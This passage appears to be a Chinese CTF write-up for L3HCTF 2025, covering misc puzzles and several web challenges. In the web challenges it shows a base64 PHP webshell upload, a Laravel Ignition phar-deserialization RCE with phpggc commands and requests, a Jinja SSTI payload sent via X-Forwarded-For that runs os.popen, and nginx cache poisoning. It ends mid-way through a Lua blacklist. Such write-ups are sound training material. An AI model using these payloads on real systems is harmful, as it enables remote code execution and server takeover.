<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">img1_path, img2_path, output_path=<span class="string">&quot;xor_result.png&quot;</span></span>):</span><br><span class="line">    <span class="comment"># 加载并转换为RGB格式</span></span><br><span class="line">    img1 = Image.<span class="built_in">open</span>(img1_path).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">    img2 = Image.<span class="built_in">open</span>(img2_path).convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> img1.size != img2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;图片尺寸不一致，无法进行异或运算&quot;</span>)</span><br><span class="line"></span><br><span class="line">    w, h = img1.size</span><br><span class="line">    result = Image.new(<span class="string">&quot;RGB&quot;</span>, (w, h))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每像素逐位异或</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">            r1, g1, b1 = img1.getpixel((x, y))</span><br><span class="line">            r2, g2, b2 = img2.getpixel((x, y))</span><br><span class="line">            result.putpixel((x, y), (</span><br><span class="line">                r1 ^ r2,</span><br><span class="line">                g1 ^ g2,</span><br><span class="line">                b1 ^ b2</span><br><span class="line">            ))</span><br><span class="line"></span><br><span class="line">    result.save(output_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 已保存异或图像为: <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例用法</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    xor_images(<span class="string">&quot;1.webp&quot;</span>, <span class="string">&quot;2.webp&quot;</span>, <span class="string">&quot;xor_result.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到图片还是用项目解码</p>
<p><img src="../images/2025-L3HCTF/dbaa88a4-49fe-46ba-b209-f25d43fd9476.png" alt="img"></p>
<h2><span id="please-sign-in">Please Sign In</span><a href="#please-sign-in" class="header-anchor"></a></h2><p>真签到题 ai梭哈点击就送哦内盖</p>
<p>丢给gpt让gpt生成脚本即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"><span class="keyword">from</span> torchvision.models <span class="keyword">import</span> shufflenet_v2_x1_0, ShuffleNet_V2_X1_0_Weights</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_embedding_to_image</span>(<span class="params">embedding_path, output_path, steps=<span class="number">500</span>, lr=<span class="number">0.1</span></span>):</span><br><span class="line">    <span class="comment"># Load model</span></span><br><span class="line">    model = shufflenet_v2_x1_0(weights=ShuffleNet_V2_X1_0_Weights.IMAGENET1K_V1)</span><br><span class="line">    model.fc = torch.nn.Identity()</span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load target embedding</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(embedding_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        target_emb = torch.tensor(json.load(f), dtype=torch.float32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Initialize trainable image tensor (noise)</span></span><br><span class="line">    img = torch.randn(<span class="number">1</span>, <span class="number">3</span>, <span class="number">224</span>, <span class="number">224</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.Adam([img], lr=lr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(steps):</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        <span class="comment"># Sigmoid to bound pixels between 0 and 1</span></span><br><span class="line">        clipped = img.sigmoid()</span><br><span class="line">        emb = model(clipped)[<span class="number">0</span>]</span><br><span class="line">        loss = torch.nn.functional.mse_loss(emb, target_emb)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        <span class="keyword">if</span> step % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Step <span class="subst">&#123;step&#125;</span>, Loss <span class="subst">&#123;loss.item():<span class="number">.6</span>e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Convert to image and save</span></span><br><span class="line">    result = (clipped.detach().squeeze().permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>).cpu().numpy() * <span class="number">255</span>).astype(<span class="string">&#x27;uint8&#x27;</span>)</span><br><span class="line">    inv_image = Image.fromarray(result)</span><br><span class="line">    inv_image.save(output_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Inverted image saved to &#x27;<span class="subst">&#123;output_path&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_and_print_response</span>(<span class="params">image_path, server_url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(image_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;File &#x27;<span class="subst">&#123;image_path&#125;</span>&#x27; not found.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(image_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: f&#125;</span><br><span class="line">        response = requests.post(server_url, files=files)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Server response:&quot;</span>, response.json())</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Server response (text):&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    EMB_PATH = <span class="string">&#x27;embedding.json&#x27;</span></span><br><span class="line">    OUT_IMG = <span class="string">&#x27;inverted_image.png&#x27;</span></span><br><span class="line">    SIGNIN_URL = <span class="string">&#x27;http://1.95.8.146:50001/signin/&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 1: Invert embedding to image</span></span><br><span class="line">    invert_embedding_to_image(EMB_PATH, OUT_IMG, steps=<span class="number">500</span>, lr=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 2: Upload image and print the flag or failure</span></span><br><span class="line">    upload_and_print_response(OUT_IMG, SIGNIN_URL)</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-L3HCTF/1daa888b-d0cc-4a51-bef2-d6d262291ac5.png" alt="img"></p>
<h2><span id="paperback">PaperBack</span><a href="#paperback" class="header-anchor"></a></h2><p>给出了一条纸带上面全是点阵，看题目描述感觉像是拿纸带来保存数据，而且题目中提到了OllyDbg，通过关键词纸带和ollydbg可以搜到一个叫Paperback的东西：<a href="https://ollydbg.de/Paperbak/">https://ollydbg.de/Paperbak/</a> ，下载这个软件扫描这条纸带可以扫描出一个很大的，但是内容空白的文件，放进Cyberchef转为hex可以看到：</p>
<p><img src="../images/2025-L3HCTF/321aeec8-1d5b-442a-acf6-bc4b3aa0e76c.png" alt="img"></p>
<p>只有20、09、0d、0a四种字符，而0d0a实际上就是<code>\r\n</code>，可以忽略，在这里将<code>0d 0a </code>换成换行可以得到：</p>
<p><img src="../images/2025-L3HCTF/935d47d1-f07f-4cf2-b9c3-d8c8025d9b4f.png" alt="img"></p>
<p>发现有很多单独出现的09，应该可以忽略，其余的每一行都只有20和09，而且除了第一行和那些单独出现的09之外全是十二个一组，猜测是二进制，且20对应0，09对应1，处理一下可以得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">01001100  </span><br><span class="line">00110011  </span><br><span class="line">01001000  </span><br><span class="line">01000011  </span><br><span class="line">01010100  </span><br><span class="line">01000110  </span><br><span class="line">01111011  </span><br><span class="line">01110111  </span><br><span class="line">01100101  </span><br><span class="line">01101100  </span><br><span class="line">01100011  </span><br><span class="line">01101111  </span><br><span class="line">01101101  </span><br><span class="line">01100101  </span><br><span class="line">01011111  </span><br><span class="line">01110100  </span><br><span class="line">01101111  </span><br><span class="line">01011111  </span><br><span class="line">01101100  </span><br><span class="line">00110011  </span><br><span class="line">01101000  </span><br><span class="line">01100011  </span><br><span class="line">01110100  </span><br><span class="line">01100110  </span><br><span class="line">00110010  </span><br><span class="line">00110000  </span><br><span class="line">00110010  </span><br><span class="line">00110101  </span><br><span class="line">01111101</span><br></pre></td></tr></table></figure>

<p>用Cyberchef转换一下就可以得到flag：</p>
<p><img src="../images/2025-L3HCTF/062d6937-e725-4a9c-9c29-a35978a11797.png" alt="img"></p>
<h2><span id="why-not-read-it-out">Why not read it out?</span><a href="#why-not-read-it-out" class="header-anchor"></a></h2><p>魔改trunic，手搓音标表</p>
<p>首先现在附件得到一个README文件，用010看看发现是jpg，而且末尾藏了一个翻转的base64编码，处理一下得到提示IGN Review，同时修改文件后缀打开图片得到以下内容</p>
<p><img src="../images/2025-L3HCTF/4366a723-310c-48c4-8277-4e6795d49a10.jpg" alt="img"></p>
<p>简单社工一下，确定这些文字来自于tunic这个游戏，这是一种由游戏作者自创的音标文字，将单词的音标划分为元音和辅音后，通过外圆内辅的构造方式拼凑出英文单词</p>
<p><img src="../images/2025-L3HCTF/305f380b-1cef-4381-a515-c87183afa9ca.png" alt="img"></p>
<p>然而正常去破译密文会发现不对劲，很多音标根本对不上，显然是出题人把文字给魔改了</p>
<p>此时再次分析提示，可以知道要去看ign的评论，在ign官网找到这个游戏后可以发现对应的官方测评只有下面这一个</p>
<p><a href="https://www.ign.com/articles/tunic-review-xbox-pc-steam">https://www.ign.com/articles/tunic-review-xbox-pc-steam</a></p>
<p>通过对比发现，评测的第一段内容与密文的前面一大段都是完全对应的，因此我们得到了魔改tunic文字的密文以及对应明文</p>
<p><img src="../images/2025-L3HCTF/c234ae48-7282-4de3-b6d4-62eac05daa20.png" alt="img"></p>
<p>随后我们要做的就是手搓映射表，然后解出下面的五条文字即可得到flag</p>
<p><img src="../images/2025-L3HCTF/18785a00-1b8d-4bee-b00e-6482c66d9702.png" alt="img"></p>
<p>最终破译出来的内容大致如下，简单处理一下即可得到正确的flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">the content of flag <span class="keyword">is</span>: come on little brave fox</span><br><span class="line">replace lesser o <span class="keyword">with</span> number zero, letter l <span class="keyword">with</span> number one</span><br><span class="line">replace lesser a <span class="keyword">with</span> symbol at</span><br><span class="line">make every lesser e uppercase</span><br><span class="line">use underline to link each word</span><br></pre></td></tr></table></figure>

<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="sai-bo-zhen-tan">赛博侦探</span><a href="#sai-bo-zhen-tan" class="header-anchor"></a></h2><p>抓包得到路由</p>
<p><img src="../images/2025-L3HCTF/2e309494-31a1-4e2c-ad39-baa4c1c43b5f.png" alt="img"></p>
<p>回答四个问题</p>
<p>邮箱根据下载的docx</p>
<p><img src="../images/2025-L3HCTF/41aecc71-b7f7-4182-9795-cacd56335a56.png" alt="img"></p>
<p>店铺根据羽毛球店的距离可以得到大致的地点</p>
<p><img src="../images/2025-L3HCTF/6e0f3c45-7240-4149-b3a8-30ea3e563a7b.png" alt="img"></p>
<p>取 114.175958,30.623494</p>
<p>老家一开始猜测就是武汉，实际需要通过机票码扫描</p>
<p><img src="../images/2025-L3HCTF/50758324-d972-4025-a866-3e94ef0718a1.png" alt="img"></p>
<p>知道了老家是福州以及英文名LELAND</p>
<p>跳转到路由&#x2F;secret&#x2F;my_lovely_photos，分析图片都是?name&#x3D;，猜测文件读取</p>
<p><img src="../images/2025-L3HCTF/d2feac3a-b04a-4cbb-9a31-0567507cfbc7.png" alt="img"></p>
<p>下载文件得到flag</p>
<h2><span id="gogogo-chu-fa-lou">gogogo出发喽</span><a href="#gogogo-chu-fa-lou" class="header-anchor"></a></h2><p><img src="../images/2025-L3HCTF/228a2243-d2e9-4304-9c4d-468c5e905c71.png" alt="img"></p>
<p>可以爆破出是<code>admin888</code>，本地也能getshell，但是不能进远程的后台，419错误。发现是开启了debug模式的，访问<code>/_ignition/health-check</code>得到的{“can_execute_commands”:true}这个回显，查看MakeViewVariableOptionalSolution.php</p>
<p><img src="../images/2025-L3HCTF/af08c65a-59dc-4dd2-9dd5-34334b129146.png" alt="img"></p>
<p>利用phpggc生成恶意payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -d <span class="string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="string">&quot;phpinfo();&quot;</span> --phar phar -o /tmp/phar.gif</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /tmp/phar.gif | <span class="built_in">base64</span> -w 0</span><br></pre></td></tr></table></figure>

<p>尝试直接利用CVE发现不能成功，审计代码找到一个上传文件的接口</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/image/base64</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.95.8.146:41164</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>169</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://1.95.8.146:41164</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1.95.8.146:41164/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"> </span><br><span class="line">&#123;&quot;data&quot;: &quot;data:image/jpeg;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-L3HCTF/20a51efc-3408-4c46-9a70-ee322c047832.png" alt="img"></p>
<p>成功上传，尝试写入phar文件</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.95.8.146:41164</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-nix">&#123;<span class="string">&quot;solution&quot;</span>:<span class="string">&quot;Facade<span class="char escape_">\\</span>Ignition<span class="char escape_">\\</span>Solutions<span class="char escape_">\\</span>MakeViewVariableOptionalSolution&quot;</span>,<span class="string">&quot;parameters&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-nix"><span class="string">&quot;viewFile&quot;</span>:<span class="string">&quot;phar:///var/www/html/public/uploads/images/_uc40mzhOJ6cNEKoF.jpeg/test.txt&quot;</span>,</span></span><br><span class="line"><span class="language-nix"><span class="string">&quot;variableName&quot;</span>:<span class="string">&quot;test&quot;</span></span></span><br><span class="line"><span class="language-nix">&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-L3HCTF/f6b72b2a-24d7-410d-8366-6e77e42b067d.png" alt="img"></p>
<p>测试发现fast_destruct就可以绕过了，修复签名的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read() </span><br><span class="line">   </span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar1.gif&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure>

<p>有了shell之后，发现权限不够，suid提权即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -<span class="keyword">in</span> <span class="string">&quot;/flag_gogogo_chufalong&quot;</span></span><br></pre></td></tr></table></figure>

<h2><span id="best-profile"><strong>best_profile</strong></span><a href="#best-profile" class="header-anchor"></a></h2><p>此路由二次渲染last_ip,如果last_ip可控会造成模板注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ip_detail/&lt;string:username&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">route_ip_detail</span>(<span class="params">username</span>):</span><br><span class="line">    res = requests.get(<span class="string">f&quot;http://127.0.0.1/get_last_ip/<span class="subst">&#123;username&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Get last ip failed.&quot;</span></span><br><span class="line">    last_ip = res.text</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = re.findall(<span class="string">r&quot;\d+\.\d+\.\d+\.\d+&quot;</span>, last_ip)</span><br><span class="line">        country = geoip2_reader.country(ip)</span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        country = <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;IP Detail&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;div&gt;<span class="subst">&#123;last_ip&#125;</span>&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Country:<span class="subst">&#123;country&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure>

<p>应用使用了ProxyFix中间件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from werkzeug.middleware.proxy_fix import ProxyFix</span><br><span class="line">app.wsgi_app = ProxyFix(app.wsgi_app)</span><br></pre></td></tr></table></figure>

<p>ProxyFix中间件的作用是从代理服务器传递的请求头中获取客户端的真实IP地址。当请求经过代理（如Nginx）时，原始客户端的IP会被保存在X-Forwarded-For头中。通过设置ProxyFix中间件，Flask的request.remote_addr将不再使用直接连接的客户端IP（通常是代理服务器的IP），而是使用X-Forwarded-For请求头中的IP地址。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X<span class="operator">-</span>Forwarded<span class="operator">-</span><span class="keyword">For</span>: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> &#123;<span class="operator">%</span><span class="keyword">set</span> ca<span class="operator">=</span>e<span class="operator">|</span>slice(<span class="number">16</span>)<span class="operator">|</span>string<span class="operator">|</span>batch(<span class="number">16</span>)<span class="operator">|</span><span class="keyword">first</span><span class="operator">|</span><span class="keyword">last</span><span class="operator">+</span>e<span class="operator">|</span>slice(<span class="number">7</span>)<span class="operator">|</span>string<span class="operator">|</span>batch(<span class="number">7</span>)<span class="operator">|</span><span class="keyword">first</span><span class="operator">|</span><span class="keyword">last</span><span class="operator">+</span>e<span class="operator">|</span>slice(<span class="number">8</span>)<span class="operator">|</span>string<span class="operator">|</span>batch(<span class="number">8</span>)<span class="operator">|</span><span class="keyword">first</span><span class="operator">|</span><span class="keyword">last</span><span class="operator">+</span>e<span class="operator">|</span>slice(<span class="number">11</span>)<span class="operator">|</span>string<span class="operator">|</span>batch(<span class="number">11</span>)<span class="operator">|</span><span class="keyword">first</span><span class="operator">|</span><span class="keyword">last</span><span class="operator">+</span>cycler.__doc__[<span class="number">697</span>]<span class="operator">+</span>e<span class="operator">|</span>pprint<span class="operator">|</span>lower<span class="operator">|</span>batch(<span class="number">5</span>)<span class="operator">|</span><span class="keyword">first</span><span class="operator">|</span><span class="keyword">last</span><span class="operator">+</span>e<span class="operator">|</span>slice(<span class="number">28</span>)<span class="operator">|</span>string<span class="operator">|</span>batch(<span class="number">28</span>)<span class="operator">|</span><span class="keyword">first</span><span class="operator">|</span><span class="keyword">last</span><span class="operator">+</span>e<span class="operator">|</span>slice(<span class="number">7</span>)<span class="operator">|</span>string<span class="operator">|</span>batch(<span class="number">7</span>)<span class="operator">|</span><span class="keyword">first</span><span class="operator">|</span><span class="keyword">last</span><span class="operator">+</span>e<span class="operator">|</span>slice(<span class="number">2</span>)<span class="operator">|</span>string<span class="operator">|</span>batch(<span class="number">2</span>)<span class="operator">|</span><span class="keyword">first</span><span class="operator">|</span><span class="keyword">last</span><span class="operator">%</span>&#125;&#123;&#123;(sbwaf.__eq__.__globals__.sys.modules.os.popen(ca)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件中有如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123;</span><br><span class="line">    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;</span><br><span class="line">    proxy_pass http://127.0.0.1:5000;</span><br><span class="line">    proxy_cache static;</span><br><span class="line">    proxy_cache_valid 200 302 30d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ .*\.(js|css)?$ &#123;</span><br><span class="line">    proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;</span><br><span class="line">    proxy_pass http://127.0.0.1:5000;</span><br><span class="line">    proxy_cache static;</span><br><span class="line">    proxy_cache_valid 200 302 12h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器设置了缓存所有以.js结尾的响应,同时注册功能没有限制用户名中的特殊字符,这使得我们可以构造特殊的用户名,例如:username.js。当我们注册完成后先向<code>/</code>发送带有<code>X-Forwarded-For:xxx</code>的请求，再向<code>/get_last_ip/username.js</code>发送请求,服务器返回的响应会被缓存,无论接下来的请求是否携带cookie,只要路径相同,返回的结果都会是相同的。<code>/ip_detail</code>路由内部向<code>/get_last_ip</code>发送的请求即使不携带cookie也会返回我们给予的last_ip。</p>
<h2><span id="gateway-advance">gateway_advance</span><a href="#gateway-advance" class="header-anchor"></a></h2><p>对于此处的过滤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">access_by_lua_block &#123;</span><br><span class="line">    <span class="type">local</span> <span class="variable">blacklist</span> <span class="operator">=</span> &#123;<span class="string">&quot;%.&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;proc&quot;</span>&#125;</span><br><span class="line">    <span class="type">local</span> <span class="variable">args</span> <span class="operator">=</span> ngx.req.get_uri_args()</span><br><span class="line">    <span class="keyword">for</span> k, v in <span class="title function_">pairs</span><span class="params">(args)</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> _, b in <span class="title function_">ipairs</span><span class="params">(blacklist)</span> <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">if</span> 